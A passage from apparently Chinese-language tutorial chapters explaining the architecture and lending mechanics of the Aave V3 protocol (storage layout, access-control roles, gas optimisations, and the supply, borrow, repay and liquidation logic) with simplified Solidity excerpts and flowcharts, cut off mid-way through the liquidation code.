0: 是否用作抵押品\n    // - bit 1: 是否有借贷\n    // 最多支持 128 个储备\n    uint256 data;\n}\n位操作：\nlibrary UserConfiguration {\n    uint256 internal constant BORROWING_MASK =\n        0x5555555555555555555555555555555555555555555555555555555555555555;\n \n    function isBorrowing(DataTypes.UserConfigurationMap storage self, uint256 reserveIndex)\n        internal view returns (bool)\n    {\n        unchecked {\n            return (self.data &gt;&gt; (reserveIndex &lt;&lt; 1)) &amp; 1 != 0;\n        }\n    }\n \n    function isUsingAsCollateral(DataTypes.UserConfigurationMap storage self, uint256 reserveIndex)\n        internal view returns (bool)\n    {\n        unchecked {\n            return (self.data &gt;&gt; ((reserveIndex &lt;&lt; 1) + 1)) &amp; 1 != 0;\n        }\n    }\n}\n4.3 ReserveCache - 储备缓存\nstruct ReserveCache {\n    // 当前和下一个缩放可变债务\n    uint256 currScaledVariableDebt;\n    uint256 nextScaledVariableDebt;\n \n    // 固定债务相关\n    uint256 currPrincipalStableDebt;\n    uint256 currAvgStableBorrowRate;\n    uint256 currTotalStableDebt;\n    uint256 nextAvgStableBorrowRate;\n    uint256 nextTotalStableDebt;\n \n    // 流动性指数\n    uint256 currLiquidityIndex;\n    uint256 nextLiquidityIndex;\n \n    // 可变借贷指数\n    uint256 currVariableBorrowIndex;\n    uint256 nextVariableBorrowIndex;\n \n    // 利率\n    uint256 currLiquidityRate;\n    uint256 currVariableBorrowRate;\n \n    // 配置\n    uint256 reserveFactor;\n    ReserveConfigurationMap reserveConfiguration;\n \n    // 代币地址\n    address aTokenAddress;\n    address stableDebtTokenAddress;\n    address variableDebtTokenAddress;\n \n    // 时间戳\n    uint40 reserveLastUpdateTimestamp;\n    uint40 stableDebtLastUpdateTimestamp;\n}\n使用场景：\nfunction executeSupply(...) external {\n    DataTypes.ReserveData storage reserve = reservesData[params.asset];\n \n    // 一次性加载到内存，避免重复 SLOAD\n    DataTypes.ReserveCache memory reserveCache = reserve.cache();\n \n    // 后续操作使用缓存\n    reserve.updateState(reserveCache);\n    ValidationLogic.validateSupply(reserveCache, reserve, params.amount);\n    reserve.updateInterestRates(reserveCache, params.asset, params.amount, 0);\n}\n\n5. 状态管理流程\n5.1 操作生命周期\n用户调用\n    │\n    ▼\n┌─────────────────────────────────────┐\n│ 1. 参数验证 (ValidationLogic)       │\n│    - 检查储备状态                   │\n│    - 验证金额                       │\n│    - 检查用户权限                   │\n└─────────────────────────────────────┘\n    │\n    ▼\n┌─────────────────────────────────────┐\n│ 2. 状态缓存 (reserve.cache())       │\n│    - 加载储备数据到内存             │\n│    - 读取当前指数                   │\n│    - 读取债务数据                   │\n└─────────────────────────────────────┘\n    │\n    ▼\n┌─────────────────────────────────────┐\n│ 3. 状态更新 (reserve.updateState)   │\n│    - 计算累积利息                   │\n│    - 更新流动性指数                 │\n│    - 更新借贷指数                   │\n└─────────────────────────────────────┘\n    │\n    ▼\n┌─────────────────────────────────────┐\n│ 4. 利率更新 (updateInterestRates)   │\n│    - 计算新的利用率                 │\n│    - 应用利率模型                   │\n│    - 更新利率                       │\n└─────────────────────────────────────┘\n    │\n    ▼\n┌─────────────────────────────────────┐\n│ 5. 代币操作                         │\n│    - mint/burn aToken               │\n│    - mint/burn 债务代币             │\n│    - 转移基础资产                   │\n└─────────────────────────────────────┘\n    │\n    ▼\n┌─────────────────────────────────────┐\n│ 6. 事件发射                         │\n│    - 记录链上日志                   │\n│    - 便于链下索引                   │\n└─────────────────────────────────────┘\n\n5.2 状态更新核心代码\nfunction updateState(\n    DataTypes.ReserveData storage reserve,\n    DataTypes.ReserveCache memory reserveCache\n) internal {\n    // 如果最后更新时间等于当前时间，无需更新\n    if (reserve.lastUpdateTimestamp == uint40(block.timestamp)) {\n        return;\n    }\n \n    // 更新流动性累积指数\n    _updateIndexes(reserve, reserveCache);\n \n    // 累积协议费用到国库\n    _accrueToTreasury(reserve, reserveCache);\n \n    // 更新时间戳\n    reserve.lastUpdateTimestamp = uint40(block.timestamp);\n}\n \nfunction _updateIndexes(\n    DataTypes.ReserveData storage reserve,\n    DataTypes.ReserveCache memory reserveCache\n) internal {\n    // 计算自上次更新以来的复利\n    uint256 cumulatedLiquidityInterest = MathUtils.calculateLinearInterest(\n        reserveCache.currLiquidityRate,\n        reserveCache.reserveLastUpdateTimestamp\n    );\n \n    // 更新流动性指数: newIndex = oldIndex * (1 + rate * time)\n    reserveCache.nextLiquidityIndex = cumulatedLiquidityInterest.rayMul(reserveCache.currLiquidityIndex);\n    reserve.liquidityIndex = reserveCache.nextLiquidityIndex.toUint128();\n \n    // 只有存在可变债务时才更新借贷指数\n    if (reserveCache.currScaledVariableDebt != 0) {\n        uint256 cumulatedVariableBorrowInterest = MathUtils.calculateCompoundedInterest(\n            reserveCache.currVariableBorrowRate,\n            reserveCache.reserveLastUpdateTimestamp\n        );\n        reserveCache.nextVariableBorrowIndex = cumulatedVariableBorrowInterest.rayMul(reserveCache.currVariableBorrowIndex);\n        reserve.variableBorrowIndex = reserveCache.nextVariableBorrowIndex.toUint128();\n    }\n}\n\n6. 权限控制系统\n6.1 ACL 角色层次\n                    ┌─────────────────┐\n                    │  DEFAULT_ADMIN  │\n                    │    (最高权限)   │\n                    └────────┬────────┘\n                             │\n            ┌────────────────┼────────────────┐\n            │                │                │\n            ▼                ▼                ▼\n    ┌───────────────┐ ┌───────────────┐ ┌───────────────┐\n    │  POOL_ADMIN   │ │EMERGENCY_ADMIN│ │  RISK_ADMIN   │\n    │   池管理员    │ │   紧急管理员   │ │   风险管理员  │\n    └───────────────┘ └───────────────┘ └───────────────┘\n            │                                    │\n            ▼                                    ▼\n    ┌───────────────┐                    ┌───────────────┐\n    │ASSET_LISTING  │                    │ FLASH_BORROWER│\n    │    ADMIN      │                    │   闪电贷用户  │\n    └───────────────┘                    └───────────────┘\n\n6.2 权限定义\ncontract ACLManager {\n    bytes32 public constant POOL_ADMIN_ROLE = keccak256(&#039;POOL_ADMIN&#039;);\n    bytes32 public constant EMERGENCY_ADMIN_ROLE = keccak256(&#039;EMERGENCY_ADMIN&#039;);\n    bytes32 public constant RISK_ADMIN_ROLE = keccak256(&#039;RISK_ADMIN&#039;);\n    bytes32 public constant FLASH_BORROWER_ROLE = keccak256(&#039;FLASH_BORROWER&#039;);\n    bytes32 public constant BRIDGE_ROLE = keccak256(&#039;BRIDGE&#039;);\n    bytes32 public constant ASSET_LISTING_ADMIN_ROLE = keccak256(&#039;ASSET_LISTING_ADMIN&#039;);\n}\n6.3 权限检查\n// PoolConfigurator 中的权限检查\nmodifier onlyPoolAdmin() {\n    _onlyPoolAdmin();\n    _;\n}\n \nfunction _onlyPoolAdmin() internal view {\n    IACLManager aclManager = IACLManager(_addressesProvider.getACLManager());\n    require(aclManager.isPoolAdmin(msg.sender), &#039;Caller is not Pool Admin&#039;);\n}\n \n// 紧急暂停\nfunction setPoolPause(bool paused) external override onlyEmergencyAdmin {\n    _pool.setPoolPause(paused);\n}\n\n7. Gas 优化技术\n7.1 存储优化策略\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n技术描述Gas 节省紧密打包相关字段放同一槽~20,000 gas/操作位图存储多个布尔值压缩~15,000 gas/操作内存缓存减少重复读取~5,000 gas/操作unchecked跳过溢出检查~100 gas/操作\n7.2 L2Pool 优化\n// L2Pool.sol - 专为 L2 优化的实现\nfunction supply(bytes32 args) external override {\n    // 从压缩参数解码\n    (address asset, uint256 amount, uint16 referralCode) =\n        CalldataLogic.decodeSupplyParams(_reservesList, args);\n \n    supply(asset, amount, msg.sender, referralCode);\n}\n \n// CalldataLogic.sol\nfunction decodeSupplyParams(\n    mapping(uint256 =&gt; address) storage reservesList,\n    bytes32 args\n) internal view returns (address, uint256, uint16) {\n    uint16 assetId;\n    uint256 amount;\n    uint16 referralCode;\n \n    assembly {\n        assetId := and(args, 0xFFFF)\n        amount := and(shr(16, args), 0xFFFFFFFFFFFFFFFFFFFFFFFF)\n        referralCode := and(shr(144, args), 0xFFFF)\n    }\n \n    return (reservesList[assetId], amount, referralCode);\n}\nL2 优化效果：\n\ncalldata 从 ~200 bytes 压缩到 32 bytes\nL2 网络交易成本降低 50-70%\n\n\n8. 小结\nAave V3 的架构设计体现了 DeFi 协议的最佳实践：\n\n模块化设计：通过库模式实现代码复用和升级灵活性\n存储优化：位图和紧密打包显著降低 Gas 消耗\n安全性：多层权限控制和验证逻辑\n可扩展性：代理模式支持无缝升级\n多链友好：L2Pool 和 Portal 支持多链部署\n\n下一章将详细讲解存款、借贷、还款、清算等核心借贷机制的实现。"},"blockchainguide/DApp_Development/应用场景/defi/aave/02-借贷机制详解":{"slug":"blockchainguide/DApp_Development/应用场景/defi/aave/02-借贷机制详解","filePath":"blockchainguide/DApp_Development/应用场景/defi/aave/02-借贷机制详解.md","title":"02-借贷机制详解","links":[],"tags":[],"content":"Aave V3 借贷机制详解\n1. 概述\nAave V3 的核心借贷操作包括：\n\nSupply (存款)：将资产存入流动性池\nBorrow (借贷)：以抵押品借出资产\nRepay (还款)：偿还借贷债务\nWithdraw (取款)：从流动性池取出资产\nLiquidation (清算)：清算不健康的借贷头寸\n\n\n2. Supply (存款功能)\n2.1 存款流程图\n用户调用 supply()\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 1. ValidationLogic.validateSupply │\n│    - 检查储备是否激活             │\n│    - 检查储备是否未暂停           │\n│    - 验证存款金额 &gt; 0             │\n│    - 检查是否超过供应上限         │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 2. reserve.updateState            │\n│    - 更新流动性指数               │\n│    - 更新借贷指数                 │\n│    - 累积协议费用                 │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 3. reserve.updateInterestRates    │\n│    - 计算新利用率                 │\n│    - 应用利率策略                 │\n│    - 更新利率                     │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 4. 资产转移                       │\n│    - 从用户转移到 aToken 合约     │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 5. 铸造 aToken                    │\n│    - 为用户铸造等量 aToken        │\n│    - 首次存款自动启用抵押品       │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 6. 发射 Supply 事件               │\n└───────────────────────────────────┘\n\n2.2 核心代码实现\n// SupplyLogic.sol\nfunction executeSupply(\n    mapping(address =&gt; DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 =&gt; address) storage reservesList,\n    DataTypes.UserConfigurationMap storage userConfig,\n    DataTypes.ExecuteSupplyParams memory params\n) external {\n    DataTypes.ReserveData storage reserve = reservesData[params.asset];\n    DataTypes.ReserveCache memory reserveCache = reserve.cache();\n \n    // 1. 更新储备状态（累积利息）\n    reserve.updateState(reserveCache);\n \n    // 2. 验证存款参数\n    ValidationLogic.validateSupply(reserveCache, reserve, params.amount);\n \n    // 3. 更新利率\n    reserve.updateInterestRates(reserveCache, params.asset, params.amount, 0);\n \n    // 4. 转移基础资产到 aToken 合约\n    IERC20(params.asset).safeTransferFrom(\n        msg.sender,\n        reserveCache.aTokenAddress,\n        params.amount\n    );\n \n    // 5. 铸造 aToken\n    bool isFirstSupply = IAToken(reserveCache.aTokenAddress).mint(\n        msg.sender,                          // caller\n        params.onBehalfOf,                   // 接收者\n        params.amount,                       // 金额\n        reserveCache.nextLiquidityIndex      // 当前流动性指数\n    );\n \n    // 6. 首次存款自动启用抵押品（如果允许）\n    if (isFirstSupply) {\n        if (\n            ValidationLogic.validateAutomaticUseAsCollateral(\n                reservesData,\n                reservesList,\n                userConfig,\n                reserveCache.reserveConfiguration,\n                reserveCache.aTokenAddress\n            )\n        ) {\n            userConfig.setUsingAsCollateral(reserve.id, true);\n            emit ReserveUsedAsCollateralEnabled(params.asset, params.onBehalfOf);\n        }\n    }\n \n    emit Supply(params.asset, msg.sender, params.onBehalfOf, params.amount, params.referralCode);\n}\n2.3 存款验证逻辑\nfunction validateSupply(\n    DataTypes.ReserveCache memory reserveCache,\n    DataTypes.ReserveData storage reserve,\n    uint256 amount\n) internal view {\n    require(amount != 0, Errors.INVALID_AMOUNT);\n \n    (bool isActive, bool isFrozen, , , bool isPaused) =\n        reserveCache.reserveConfiguration.getFlags();\n \n    require(isActive, Errors.RESERVE_INACTIVE);\n    require(!isPaused, Errors.RESERVE_PAUSED);\n    require(!isFrozen, Errors.RESERVE_FROZEN);\n \n    // 检查供应上限\n    uint256 supplyCap = reserveCache.reserveConfiguration.getSupplyCap();\n    require(\n        supplyCap == 0 ||\n        ((IAToken(reserveCache.aTokenAddress).scaledTotalSupply() +\n            uint256(reserve.accruedToTreasury)).rayMul(reserveCache.nextLiquidityIndex) + amount) &lt;=\n            supplyCap * (10**reserveCache.reserveConfiguration.getDecimals()),\n        Errors.SUPPLY_CAP_EXCEEDED\n    );\n}\n\n3. Borrow (借贷功能)\n3.1 借贷流程图\n用户调用 borrow()\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 1. 检查隔离模式状态               │\n│    - 是否在隔离模式               │\n│    - 隔离模式抵押品地址           │\n│    - 隔离模式债务上限             │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 2. ValidationLogic.validateBorrow │\n│    - 验证储备状态                 │\n│    - 检查借贷是否启用             │\n│    - 验证金额                     │\n│    - 检查抵押品是否充足           │\n│    - 验证健康因子                 │\n│    - 检查借贷上限                 │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 3. 铸造债务代币                   │\n│    ├─ STABLE: StableDebtToken     │\n│    └─ VARIABLE: VariableDebtToken │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 4. 更新用户配置                   │\n│    - 标记用户借贷状态             │\n│    - 更新隔离模式债务（如适用）   │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 5. 更新利率                       │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 6. 转移资产给用户                 │\n└───────────────────────────────────┘\n\n3.2 双利率模式\nAave V3 支持两种借贷利率模式：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n模式代币特点适用场景STABLE (固定利率)StableDebtToken利率在借款时锁定长期借贷、利率上行预期VARIABLE (浮动利率)VariableDebtToken利率随市场波动短期借贷、利率下行预期\n3.3 核心代码实现\n// BorrowLogic.sol\nfunction executeBorrow(\n    mapping(address =&gt; DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 =&gt; address) storage reservesList,\n    mapping(uint8 =&gt; DataTypes.EModeCategory) storage eModeCategories,\n    DataTypes.UserConfigurationMap storage userConfig,\n    DataTypes.ExecuteBorrowParams memory params\n) public {\n    DataTypes.ReserveData storage reserve = reservesData[params.asset];\n    DataTypes.ReserveCache memory reserveCache = reserve.cache();\n \n    reserve.updateState(reserveCache);\n \n    // 1. 检查隔离模式状态\n    (\n        bool isolationModeActive,\n        address isolationModeCollateralAddress,\n        uint256 isolationModeDebtCeiling\n    ) = userConfig.getIsolationModeState(reservesData, reservesList);\n \n    // 2. 验证借贷参数\n    ValidationLogic.validateBorrow(\n        reservesData,\n        reservesList,\n        eModeCategories,\n        DataTypes.ValidateBorrowParams({\n            reserveCache: reserveCache,\n            userConfig: userConfig,\n            asset: params.asset,\n            userAddress: params.onBehalfOf,\n            amount: params.amount,\n            interestRateMode: params.interestRateMode,\n            maxStableLoanPercent: params.maxStableRateBorrowSizePercent,\n            reservesCount: params.reservesCount,\n            oracle: params.oracle,\n            userEModeCategory: params.userEModeCategory,\n            priceOracleSentinel: params.priceOracleSentinel,\n            isolationModeActive: isolationModeActive,\n            isolationModeCollateralAddress: isolationModeCollateralAddress,\n            isolationModeDebtCeiling: isolationModeDebtCeiling\n        })\n    );\n \n    uint256 currentStableRate = 0;\n    bool isFirstBorrowing = false;\n \n    // 3. 根据利率模式铸造债务代币\n    if (params.interestRateMode == DataTypes.InterestRateMode.STABLE) {\n        // 固定利率借贷\n        currentStableRate = reserve.currentStableBorrowRate;\n        (\n            isFirstBorrowing,\n            reserveCache.nextTotalStableDebt,\n            reserveCache.nextAvgStableBorrowRate\n        ) = IStableDebtToken(reserveCache.stableDebtTokenAddress).mint(\n            params.user,\n            params.onBehalfOf,\n            params.amount,\n            currentStableRate\n        );\n    } else {\n        // 浮动利率借贷\n        (isFirstBorrowing, reserveCache.nextScaledVariableDebt) =\n            IVariableDebtToken(reserveCache.variableDebtTokenAddress).mint(\n                params.user,\n                params.onBehalfOf,\n                params.amount,\n                reserveCache.nextVariableBorrowIndex\n            );\n    }\n \n    // 4. 首次借贷更新用户配置\n    if (isFirstBorrowing) {\n        userConfig.setBorrowing(reserve.id, true);\n    }\n \n    // 5. 隔离模式债务更新\n    if (isolationModeActive) {\n        uint256 nextIsolationModeTotalDebt = reservesData[isolationModeCollateralAddress]\n            .isolationModeTotalDebt +=\n            (params.amount /\n                10 **\n                    (reserveCache.reserveConfiguration.getDecimals() -\n                        ReserveConfiguration.DEBT_CEILING_DECIMALS)).toUint128();\n \n        emit IsolationModeTotalDebtUpdated(\n            isolationModeCollateralAddress,\n            nextIsolationModeTotalDebt\n        );\n    }\n \n    // 6. 更新利率\n    reserve.updateInterestRates(\n        reserveCache,\n        params.asset,\n        0,\n        params.releaseUnderlying ? params.amount : 0\n    );\n \n    // 7. 转移资产给用户\n    if (params.releaseUnderlying) {\n        IAToken(reserveCache.aTokenAddress).transferUnderlyingTo(\n            params.user,\n            params.amount\n        );\n    }\n \n    emit Borrow(\n        params.asset,\n        params.user,\n        params.onBehalfOf,\n        params.amount,\n        params.interestRateMode,\n        params.interestRateMode == DataTypes.InterestRateMode.STABLE\n            ? currentStableRate\n            : reserve.currentVariableBorrowRate,\n        params.referralCode\n    );\n}\n3.4 借贷验证逻辑\nfunction validateBorrow(\n    mapping(address =&gt; DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 =&gt; address) storage reservesList,\n    mapping(uint8 =&gt; DataTypes.EModeCategory) storage eModeCategories,\n    DataTypes.ValidateBorrowParams memory params\n) internal view {\n    require(params.amount != 0, Errors.INVALID_AMOUNT);\n \n    // 检查储备状态\n    ValidateBorrowLocalVars memory vars;\n    (\n        vars.isActive,\n        vars.isFrozen,\n        vars.borrowingEnabled,\n        vars.stableRateBorrowingEnabled,\n        vars.isPaused\n    ) = params.reserveCache.reserveConfiguration.getFlags();\n \n    require(vars.isActive, Errors.RESERVE_INACTIVE);\n    require(!vars.isPaused, Errors.RESERVE_PAUSED);\n    require(!vars.isFrozen, Errors.RESERVE_FROZEN);\n    require(vars.borrowingEnabled, Errors.BORROWING_NOT_ENABLED);\n \n    // 检查 Oracle 哨兵状态（L2 序列器）\n    require(\n        params.priceOracleSentinel == address(0) ||\n            IPriceOracleSentinel(params.priceOracleSentinel).isBorrowAllowed(),\n        Errors.PRICE_ORACLE_SENTINEL_CHECK_FAILED\n    );\n \n    // 计算用户账户数据\n    (\n        vars.userCollateralInBaseCurrency,\n        vars.userDebtInBaseCurrency,\n        vars.currentLtv,\n        vars.currentLiquidationThreshold,\n        vars.healthFactor,\n        vars.hasZeroLtvCollateral\n    ) = GenericLogic.calculateUserAccountData(\n        reservesData,\n        reservesList,\n        eModeCategories,\n        DataTypes.CalculateUserAccountDataParams({\n            userConfig: params.userConfig,\n            reservesCount: params.reservesCount,\n            user: params.userAddress,\n            oracle: params.oracle,\n            userEModeCategory: params.userEModeCategory\n        })\n    );\n \n    require(vars.userCollateralInBaseCurrency != 0, Errors.COLLATERAL_BALANCE_IS_ZERO);\n    require(vars.currentLtv != 0, Errors.LTV_VALIDATION_FAILED);\n \n    // 计算借贷后的健康因子\n    require(\n        vars.healthFactor &gt; HEALTH_FACTOR_LIQUIDATION_THRESHOLD,\n        Errors.HEALTH_FACTOR_LOWER_THAN_LIQUIDATION_THRESHOLD\n    );\n \n    vars.amountInBaseCurrency =\n        IPriceOracleGetter(params.oracle).getAssetPrice(params.asset) *\n        params.amount /\n        vars.assetUnit;\n \n    // 检查抵押品是否足够支持新借贷\n    require(\n        vars.userCollateralInBaseCurrency.percentMul(vars.currentLtv) &gt;=\n            vars.userDebtInBaseCurrency + vars.amountInBaseCurrency,\n        Errors.COLLATERAL_CANNOT_COVER_NEW_BORROW\n    );\n \n    // 检查借贷上限\n    vars.borrowCap = params.reserveCache.reserveConfiguration.getBorrowCap();\n    require(\n        vars.borrowCap == 0 ||\n            (IAToken(params.reserveCache.aTokenAddress).scaledTotalSupply().rayMul(\n                params.reserveCache.nextVariableBorrowIndex\n            ) + params.amount) &lt;= vars.borrowCap * vars.assetUnit,\n        Errors.BORROW_CAP_EXCEEDED\n    );\n}\n\n4. Repay (还款功能)\n4.1 还款流程图\n用户调用 repay()\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 1. 获取用户当前债务               │\n│    - 固定利率债务                 │\n│    - 浮动利率债务                 │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 2. ValidationLogic.validateRepay  │\n│    - 验证还款金额                 │\n│    - 验证债务存在                 │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 3. 计算实际还款金额               │\n│    - min(用户支付, 总债务)        │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 4. 销毁债务代币                   │\n│    - burn StableDebtToken 或      │\n│    - burn VariableDebtToken       │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 5. 更新用户配置                   │\n│    - 如果债务清零则标记为非借贷   │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 6. 更新隔离模式债务（如适用）     │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 7. 更新利率并转移资产             │\n└───────────────────────────────────┘\n\n4.2 核心代码实现\n// BorrowLogic.sol\nfunction executeRepay(\n    mapping(address =&gt; DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 =&gt; address) storage reservesList,\n    DataTypes.UserConfigurationMap storage userConfig,\n    DataTypes.ExecuteRepayParams memory params\n) external returns (uint256) {\n    DataTypes.ReserveData storage reserve = reservesData[params.asset];\n    DataTypes.ReserveCache memory reserveCache = reserve.cache();\n \n    reserve.updateState(reserveCache);\n \n    // 1. 获取用户当前债务\n    (uint256 stableDebt, uint256 variableDebt) = Helpers.getUserCurrentDebt(\n        params.onBehalfOf,\n        reserveCache\n    );\n \n    // 2. 验证还款\n    ValidationLogic.validateRepay(\n        reserveCache,\n        params.amount,\n        params.interestRateMode,\n        params.onBehalfOf,\n        stableDebt,\n        variableDebt\n    );\n \n    // 3. 计算实际还款金额\n    uint256 paybackAmount = params.interestRateMode == DataTypes.InterestRateMode.STABLE\n        ? stableDebt\n        : variableDebt;\n \n    if (params.amount &lt; paybackAmount) {\n        paybackAmount = params.amount;\n    }\n \n    // 4. 销毁债务代币\n    if (params.interestRateMode == DataTypes.InterestRateMode.STABLE) {\n        (reserveCache.nextTotalStableDebt, reserveCache.nextAvgStableBorrowRate) =\n            IStableDebtToken(reserveCache.stableDebtTokenAddress).burn(\n                params.onBehalfOf,\n                paybackAmount\n            );\n    } else {\n        reserveCache.nextScaledVariableDebt = IVariableDebtToken(\n            reserveCache.variableDebtTokenAddress\n        ).burn(\n            params.onBehalfOf,\n            paybackAmount,\n            reserveCache.nextVariableBorrowIndex\n        );\n    }\n \n    // 5. 更新用户配置\n    if (stableDebt + variableDebt - paybackAmount == 0) {\n        userConfig.setBorrowing(reserve.id, false);\n    }\n \n    // 6. 更新隔离模式债务\n    (\n        bool isolationModeActive,\n        address isolationModeCollateralAddress,\n    ) = userConfig.getIsolationModeState(reservesData, reservesList);\n \n    if (isolationModeActive) {\n        uint128 isolationModeTotalDebt = reservesData[isolationModeCollateralAddress]\n            .isolationModeTotalDebt;\n \n        uint128 debtToDecrement = (paybackAmount /\n            10 ** (reserveCache.reserveConfiguration.getDecimals() -\n                ReserveConfiguration.DEBT_CEILING_DECIMALS)).toUint128();\n \n        reservesData[isolationModeCollateralAddress].isolationModeTotalDebt =\n            isolationModeTotalDebt &gt; debtToDecrement\n                ? isolationModeTotalDebt - debtToDecrement\n                : 0;\n    }\n \n    // 7. 更新利率\n    reserve.updateInterestRates(reserveCache, params.asset, paybackAmount, 0);\n \n    // 8. 转移资产\n    if (params.useATokens) {\n        IAToken(reserveCache.aTokenAddress).burn(\n            msg.sender,\n            reserveCache.aTokenAddress,\n            paybackAmount,\n            reserveCache.nextLiquidityIndex\n        );\n    } else {\n        IERC20(params.asset).safeTransferFrom(\n            msg.sender,\n            reserveCache.aTokenAddress,\n            paybackAmount\n        );\n    }\n \n    IAToken(reserveCache.aTokenAddress).handleRepayment(\n        msg.sender,\n        params.onBehalfOf,\n        paybackAmount\n    );\n \n    emit Repay(params.asset, params.onBehalfOf, msg.sender, paybackAmount, params.useATokens);\n \n    return paybackAmount;\n}\n\n5. Liquidation (清算功能)\n5.1 清算机制概述\n清算是 Aave 协议风险管理的核心机制，当借款人的健康因子低于 1 时，允许第三方清算人偿还部分债务并获得抵押品作为奖励。\n5.2 健康因子计算\n健康因子 (HF) = (Σ 抵押品价值_i × 清算阈值_i) / 总债务\n\nHF &gt; 1  → 头寸安全\nHF ≤ 1  → 头寸可被清算\n\n5.3 动态清算因子\n// 清算因子根据健康因子动态调整\nuint256 internal constant DEFAULT_LIQUIDATION_CLOSE_FACTOR = 0.5e4;   // 50%\nuint256 public constant MAX_LIQUIDATION_CLOSE_FACTOR = 1e4;           // 100%\nuint256 public constant CLOSE_FACTOR_HF_THRESHOLD = 0.95e18;          // 0.95\n \n// 计算清算因子\nuint256 closeFactor = healthFactor &gt; CLOSE_FACTOR_HF_THRESHOLD\n    ? DEFAULT_LIQUIDATION_CLOSE_FACTOR  // HF &gt; 0.95 → 最多清算 50%\n    : MAX_LIQUIDATION_CLOSE_FACTOR;     // HF ≤ 0.95 → 可清算 100%\n5.4 清算流程图\n清算人调用 liquidationCall()\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 1. 获取抵押品和债务储备数据       │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 2. 验证清算条件                   │\n│    - 健康因子 &lt; 1                 │\n│    - 用户有对应抵押品             │\n│    - 用户有对应债务               │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 3. 计算可清算债务                 │\n│    - 根据健康因子确定清算因子     │\n│    - 计算最大可清算金额           │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 4. 计算可获得抵押品               │\n│    - 基础抵押品 = 债务 / 价格     │\n│    - 总抵押品 = 基础 × 清算奖励   │\n└───────────────────────────────────┘\n        │\n        ▼\n┌───────────────────────────────────┐\n│ 5. 执行清算                       │\n│    - 销毁债务代币                 │\n│    - 转移抵押品给清算人           │\n│    - 更新用户配置                 │\n└───────────────────────────────────┘\n\n5.5 核心代码实现\n// LiquidationLogic.sol\nfunction executeLiquidationCall(\n    mapping(address =&gt; DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 =&gt; address) storage reservesList,\n    mapping(address =&gt; DataTypes.UserConfigurationMap) storage usersConfig,\n    mapping(uint8 =&gt; DataTypes.EModeCategory) storage eModeCategories,\n    DataTypes.ExecuteLiquidationCallParams memory params\n) external {\n    LiquidationCallLocalVars memory vars;\n \n    DataTypes.ReserveData storage collateralReserve = reservesData[params.collateralAsset];\n    DataTypes.ReserveData storage debtReserve = reservesData[params.debtAsset];\n    DataTypes.UserConfigurationMap storage userConfig = usersConfig[params.user];\n    DataTypes.ReserveCache memory debtReserveCache = debtReserve.cache();\n \n    debtReserve.updateState(debtReserveCache);\n \n    // 1. 验证清算条件\n    (\n        vars.userCollateralBalance,\n        vars.actualDebtToLiquidate,\n        vars.actualCollateralToLiquidate,\n        vars.healthFactor\n    ) = _calculateAvailableCollateralToLiquidate(\n        collateralReserve,\n        debtReserveCache,\n        params.collateralAsset,\n        params.debtAsset,\n        params.debtToCover,\n        userConfig,\n        params.user,\n        vars.collateralPrice,\n        vars.debtAssetPrice,\n        vars.liquidationBonus\n    );\n \n    ValidationLogic.validateLiquidationCall(\n        userConfig,\n        collateralReserve,\n        DataTypes.ValidateLiquidationCallParams({\n            debtReserveCache: debtReserveCache,\n            totalDebt: vars.userDebt,\n            healthFactor: vars.healthFactor,\n            priceOracleSentinel: params.priceOracleSentinel\n        })\n    );\n \n    // 2. 销毁债务代币\n    if (vars.userVariableDebt &gt;= vars.actualDebtToLiquidate) {\n        // 全部从可变债务清算\n        debtReserveCache.nextScaledVariableDebt = IVariableDebtToken(\n            debtReserveCache.variableDebtTokenAddress\n        ).burn(params.user, vars.actualDebtToLiquidate, debtReserveCache.nextVariableBorrowIndex);\n    } else {\n        // 先清算可变债务，再清算固定债务\n        if (vars.userVariableDebt != 0) {\n            debtReserveCache.nextScaledVariableDebt = IVariableDebtToken(\n                debtReserveCache.variableDebtTokenAddress\n            ).burn(params.user, vars.userVariableDebt, debtReserveCache.nextVariableBorrowIndex);\n        }\n        (\n            debtReserveCache.nextTotalStableDebt,\n            debtReserveCache.nextAvgStableBorrowRate\n        ) = IStableDebtToken(debtReserveCache.stableDebtTokenAddress).burn(\n            params.user,\n            vars.actualDebtToLiquidate - vars.userVariableDebt\n        );\n    }\n \n    // 3. 更新利率\n    debtReserve.updateInterestRates(\n        debtReserveCache,\n        params.debtAsset,\n        vars.actualDebtToLiquidate,\n        0\n    );\n \n    // 4. 转移抵押品\n    if (params.receiveAToken) {\n    